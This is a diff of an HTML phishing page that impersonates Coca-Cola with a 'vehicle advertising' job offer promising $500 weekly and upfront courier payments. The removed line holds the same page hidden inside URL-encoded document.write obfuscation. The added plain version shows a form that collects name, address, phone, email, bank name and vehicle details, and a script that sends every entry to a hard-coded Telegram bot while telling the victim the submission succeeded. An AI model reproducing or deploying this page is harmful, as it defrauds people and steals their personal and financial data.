@@ -1,1 +1,230 @@
-<script language=javascript>document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3ECoca-Cola%20Drink%20Advertisement%20Campaign%20Form%3C/title%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20%27Arial%27%2C%20sans-serif%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line-height%3A%201.6%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20max-width%3A%20800px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23333%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23f7f7f7%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-image%3A%20url%28%27https%3A//i.ibb.co/Hp7z91JB/Coca-Cola-logo-svg.png%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-repeat%3A%20no-repeat%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-position%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-attachment%3A%20fixed%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-size%3A%20contain%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-opacity%3A%200.1%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20h1%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ED1C16%3B%20/*%20Coca-Cola%20red%20*/%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-shadow%3A%201px%201px%202px%20rgba%280%2C0%2C0%2C0.1%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%202.2em%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.form-container%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20linear-gradient%28135deg%2C%20%23ffffff%200%25%2C%20%23f9f9f9%20100%25%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2025px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%2010px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%200%205px%2015px%20rgba%280%2C%200%2C%200%2C%200.1%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23e0e0e0%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.form-group%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20label%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%208px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23333%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20input%5Btype%3D%22text%22%5D%2C%0A%20%20%20%20%20%20%20%20input%5Btype%3D%22email%22%5D%2C%0A%20%20%20%20%20%20%20%20textarea%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2012px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23ddd%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-sizing%3A%20border-box%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20transition%3A%20border%200.3s%2C%20box-shadow%200.3s%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20input%5Btype%3D%22text%22%5D%3Afocus%2C%0A%20%20%20%20%20%20%20%20input%5Btype%3D%22email%22%5D%3Afocus%2C%0A%20%20%20%20%20%20%20%20textarea%3Afocus%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-color%3A%20%23ED1C16%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%200%200%205px%20rgba%28237%2C%2028%2C%2022%2C%200.3%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20outline%3A%20none%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.required%3Aafter%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20%22%20*%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ED1C16%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20button%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20linear-gradient%28to%20bottom%2C%20%23ED1C16%200%25%2C%20%23C11711%20100%25%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2014px%2025px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2018px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%2025px%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%2060%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20transition%3A%20all%200.3s%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%200%203px%206px%20rgba%280%2C0%2C0%2C0.1%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-transform%3A%20uppercase%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20letter-spacing%3A%201px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20button%3Ahover%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20linear-gradient%28to%20bottom%2C%20%23C11711%200%25%2C%20%23A0130E%20100%25%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20transform%3A%20translateY%28-2px%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%200%205px%2010px%20rgba%280%2C0%2C0%2C0.2%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20button%3Aactive%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20transform%3A%20translateY%280%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%200%202px%205px%20rgba%280%2C0%2C0%2C0.2%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%23form-status%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2015px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.success%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23d4edda%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23155724%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23c3e6cb%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.error%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23f8d7da%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23721c24%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23f5c6cb%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20p%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23444%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line-height%3A%201.7%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2025px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20justify%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20rgba%28255%2C%20255%2C%20255%2C%200.8%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-left%3A%204px%20solid%20%23ED1C16%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/*%20Add%20some%20Coca-Cola%20branding%20elements%20*/%0A%20%20%20%20%20%20%20%20.form-container%3A%3Abefore%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20%22%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%203px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20linear-gradient%28to%20right%2C%20%23ED1C16%2C%20%23ffffff%2C%20%23ED1C16%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%203px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.form-container%3A%3Aafter%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20%22%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%203px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20linear-gradient%28to%20right%2C%20%23ED1C16%2C%20%23ffffff%2C%20%23ED1C16%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%203px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%0A%3Cbody%3E%0A%20%20%20%20%3Cdiv%20class%3D%22form-container%22%3E%0A%20%20%20%20%20%20%20%20%3Ch1%3ECoca-Cola%20Drink%20Advertisement%20Campaign%20Form%3C/h1%3E%0A%20%20%20%20%20%20%20%20%3Cp%3EThank%20you%20for%20your%20interest%20in%20partnering%20with%20Coca-Cola%21%20We%27re%20excited%20to%20announce%20our%20new%20mobile%20advertising%20campaign%20designed%20to%20increase%20brand%20visibility%20across%20the%20United%20States.%20As%20we%20face%20growing%20competition%20in%20the%20beverage%20market%2C%20we%27re%20implementing%20this%20innovative%20strategy%20to%20connect%20with%20consumers%20nationwide.%20About%20the%20Program%20Coca-Cola%20is%20seeking%20drivers%20and%20vehicle%20owners%20across%20all%2050%20states%20to%20transform%20their%20personal%20vehicles%20into%20moving%20advertisements.%20Whether%20you%20drive%20a%20car%2C%20truck%2C%20bike%2C%20boat%2C%20lorry%2C%20or%20cart%2C%20we%20want%20to%20work%20with%20you%21%20How%20It%20Works%20Our%20professional%20team%20will%20apply%20high-quality%20vinyl%20decals%20to%20your%20vehicle%20%28covering%20partial%20or%20full%20exterior%20surfaces%29%20These%20eye-catching%2C%20colorful%20ads%20are%20designed%20to%20turn%20heads%20wherever%20you%20go%20You%20simply%20go%20about%20your%20normal%20daily%20routine%20-%20we%20handle%20all%20advertising%20logistics%20Program%20Benefits%20%u2705%20Earn%20%24500%20per%20week%20%28minimum%2010-week%20commitment%2C%20program%20runs%20for%2016%20weeks%29%20%u2705%20No%20costs%20to%20you%20-%20we%20cover%20all%20advertising%20materials%20and%20installation%20%u2705%20Receive%20upfront%20payment%20via%20secure%20courier%20service%20%u2705%20Flexible%20participation%20-%20use%20your%20vehicle%20as%20you%20normally%20would%20Why%20This%20Works%20Provides%20constant%20brand%20exposure%20in%20high-traffic%20areas%20Creates%20memorable%20impressions%20with%20captive%20audiences%20Builds%20community%20connections%20through%20local%20advertising%20This%20is%20a%20legitimate%20opportunity%20with%20no%20application%20fees%20or%20hidden%20costs.%20Coca-Cola%20will%20handle%20all%20advertising%20production%20and%20installation%20through%20our%20certified%20professionals.%20Ready%20to%20turn%20your%20vehicle%20into%20a%20moving%20billboard%3F%20Complete%20the%20simple%20application%20below%20to%20get%20started%21%3C/p%3E%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%3Cform%20id%3D%22coca-cola-form%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22full-name%22%20class%3D%22required%22%3EFull%20Name%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22full-name%22%20name%3D%22full-name%22%20required%3D%22%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22address%22%20class%3D%22required%22%3EAddress%3C/label%3E%20%3Ctextarea%20id%3D%22address%22%20name%3D%22address%22%20rows%3D%223%22%20required%3D%22%22%3E%3C/textarea%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22city%22%20class%3D%22required%22%3ECity%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22city%22%20name%3D%22city%22%20required%3D%22%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22state%22%20class%3D%22required%22%3EState%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22state%22%20name%3D%22state%22%20required%3D%22%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22zip-code%22%3EZip%20Code%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22zip-code%22%20name%3D%22zip-code%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22phone%22%20class%3D%22required%22%3EPhone%20number%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22phone%22%20name%3D%22phone%22%20required%3D%22%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22email%22%20class%3D%22required%22%3EEmail%3C/label%3E%20%3Cinput%20type%3D%22email%22%20id%3D%22email%22%20name%3D%22email%22%20required%3D%22%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22bank-name%22%20class%3D%22required%22%3EBank%20Name%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22bank-name%22%20name%3D%22bank-name%22%20required%3D%22%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22gender%22%3EGender%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22gender%22%20name%3D%22gender%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%3Clabel%20for%3D%22vehicle%22%20class%3D%22required%22%3EColor/Year/Make%20of%20Vehicle%3C/label%3E%20%3Cinput%20type%3D%22text%22%20id%3D%22vehicle%22%20name%3D%22vehicle%22%20required%3D%22%22%3E%3C/div%3E%3Cbutton%20type%3D%22submit%22%3ESubmit%20Application%3C/button%3E%0A%20%20%20%20%20%20%20%20%3C/form%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22form-status%22%3E%3Cbr%3E%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20document.getElementById%28%27coca-cola-form%27%29.addEventListener%28%27submit%27%2C%20async%20function%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20formData%20%3D%20new%20FormData%28e.target%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20formObject%20%3D%20Object.fromEntries%28formData.entries%28%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Send%20to%20Telegram%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20botToken%20%3D%20%278084035538%3AAAFpG4ozHHqvnL3K244POv0AafDqtlgdchM%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20chatId%20%3D%20%276617851936%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20let%20telegramMessage%20%3D%20%60*New%20Coca-Cola%20Ad%20Application*%5Cn%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20%28const%20%5Bkey%2C%20value%5D%20of%20Object.entries%28formObject%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20telegramMessage%20+%3D%20%60*%24%7Bkey%7D%3A*%20%24%7Bvalue%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20telegramUrl%20%3D%20%60https%3A//api.telegram.org/bot%24%7BbotToken%7D/sendMessage%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20telegramResponse%20%3D%20await%20fetch%28telegramUrl%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20chatId%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20telegramMessage%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parse_mode%3A%20%27Markdown%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showStatus%28%27Form%20submitted%20successfully%21%27%2C%20%27success%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20e.target.reset%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28error%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Error%3A%27%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showStatus%28%27There%20was%20an%20error%20submitting%20your%20form.%20Please%20try%20again.%27%2C%20%27error%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20function%20showStatus%28message%2C%20type%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20statusElement%20%3D%20document.getElementById%28%27form-status%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20statusElement.textContent%20%3D%20message%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20statusElement.className%20%3D%20type%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20statusElement.style.display%20%3D%20%27block%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20statusElement.style.display%20%3D%20%27none%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%205000%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/script%3E%0A%3C/body%3E%0A%0A%3C/html%3E'))</script>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coca-Cola Drink Advertisement Campaign Form</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333;
+            background-color: #f7f7f7;
+            background-image: url('https://i.ibb.co/Hp7z91JB/Coca-Cola-logo-svg.png');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-attachment: fixed;
+            background-size: contain;
+            background-opacity: 0.1;
+        }
+
+        h1 {
+            color: #ED1C16; /* Coca-Cola red */
+            text-align: center;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            font-size: 2.2em;
+        }
+
+        .form-container {
+            background: linear-gradient(135deg, #ffffff 0%, #f9f9f9 100%);
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e0e0e0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border 0.3s, box-shadow 0.3s;
+            background-color: #fff;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        textarea:focus {
+            border-color: #ED1C16;
+            box-shadow: 0 0 5px rgba(237, 28, 22, 0.3);
+            outline: none;
+        }
+
+        .required:after {
+            content: " *";
+            color: #ED1C16;
+        }
+
+        button {
+            background: linear-gradient(to bottom, #ED1C16 0%, #C11711 100%);
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            display: block;
+            margin: 25px auto;
+            width: 60%;
+            transition: all 0.3s;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        button:hover {
+            background: linear-gradient(to bottom, #C11711 0%, #A0130E 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 10px rgba(0,0,0,0.2);
+        }
+
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        #form-status {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            display: none;
+            font-weight: bold;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        p {
+            color: #444;
+            line-height: 1.7;
+            margin-bottom: 25px;
+            text-align: justify;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 6px;
+            border-left: 4px solid #ED1C16;
+        }
+
+        /* Add some Coca-Cola branding elements */
+        .form-container::before {
+            content: "";
+            display: block;
+            height: 3px;
+            background: linear-gradient(to right, #ED1C16, #ffffff, #ED1C16);
+            margin-bottom: 20px;
+            border-radius: 3px;
+        }
+
+        .form-container::after {
+            content: "";
+            display: block;
+            height: 3px;
+            background: linear-gradient(to right, #ED1C16, #ffffff, #ED1C16);
+            margin-top: 20px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="form-container">
+        <h1>Coca-Cola Drink Advertisement Campaign Form</h1>
+        <p>Thank you for your interest in partnering with Coca-Cola! We're excited to announce our new mobile advertising campaign designed to increase brand visibility across the United States. As we face growing competition in the beverage market, we're implementing this innovative strategy to connect with consumers nationwide. About the Program Coca-Cola is seeking drivers and vehicle owners across all 50 states to transform their personal vehicles into moving advertisements. Whether you drive a car, truck, bike, boat, lorry, or cart, we want to work with you! How It Works Our professional team will apply high-quality vinyl decals to your vehicle (covering partial or full exterior surfaces) These eye-catching, colorful ads are designed to turn heads wherever you go You simply go about your normal daily routine - we handle all advertising logistics Program Benefits ✅ Earn $500 per week (minimum 10-week commitment, program runs for 16 weeks) ✅ No costs to you - we cover all advertising materials and installation ✅ Receive upfront payment via secure courier service ✅ Flexible participation - use your vehicle as you normally would Why This Works Provides constant brand exposure in high-traffic areas Creates memorable impressions with captive audiences Builds community connections through local advertising This is a legitimate opportunity with no application fees or hidden costs. Coca-Cola will handle all advertising production and installation through our certified professionals. Ready to turn your vehicle into a moving billboard? Complete the simple application below to get started!</p>
+        
+        <form id="coca-cola-form">
+            <div class="form-group"><label for="full-name" class="required">Full Name</label> <input type="text" id="full-name" name="full-name" required=""></div>
+            <div class="form-group"><label for="address" class="required">Address</label> <textarea id="address" name="address" rows="3" required=""></textarea></div>
+            <div class="form-group"><label for="city" class="required">City</label> <input type="text" id="city" name="city" required=""></div>
+            <div class="form-group"><label for="state" class="required">State</label> <input type="text" id="state" name="state" required=""></div>
+            <div class="form-group"><label for="zip-code">Zip Code</label> <input type="text" id="zip-code" name="zip-code"></div>
+            <div class="form-group"><label for="phone" class="required">Phone number</label> <input type="text" id="phone" name="phone" required=""></div>
+            <div class="form-group"><label for="email" class="required">Email</label> <input type="email" id="email" name="email" required=""></div>
+            <div class="form-group"><label for="bank-name" class="required">Bank Name</label> <input type="text" id="bank-name" name="bank-name" required=""></div>
+            <div class="form-group"><label for="gender">Gender</label> <input type="text" id="gender" name="gender"></div>
+            <div class="form-group"><label for="vehicle" class="required">Color/Year/Make of Vehicle</label> <input type="text" id="vehicle" name="vehicle" required=""></div><button type="submit">Submit Application</button>
+        </form>
+        <div id="form-status"><br></div>
+    </div>
+    <script>
+        document.getElementById('coca-cola-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const formObject = Object.fromEntries(formData.entries());
+            
+            try {
+                // Send to Telegram
+                const botToken = '8084035538:AAFpG4ozHHqvnL3K244POv0AafDqtlgdchM';
+                const chatId = '6617851936';
+                
+                let telegramMessage = `*New Coca-Cola Ad Application*\n\n`;
+                for (const [key, value] of Object.entries(formObject)) {
+                    telegramMessage += `*${key}:* ${value}\n`;
+                }
+                
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const telegramResponse = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                showStatus('Form submitted successfully!', 'success');
+                e.target.reset();
+            } catch (error) {
+                console.error('Error:', error);
+                showStatus('There was an error submitting your form. Please try again.', 'error');
+            }
+        });
+        
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('form-status');
+            statusElement.textContent = message;
+            statusElement.className = type;
+            statusElement.style.display = 'block';
+            
+            setTimeout(() => {
+                statusElement.style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
+
+</html>
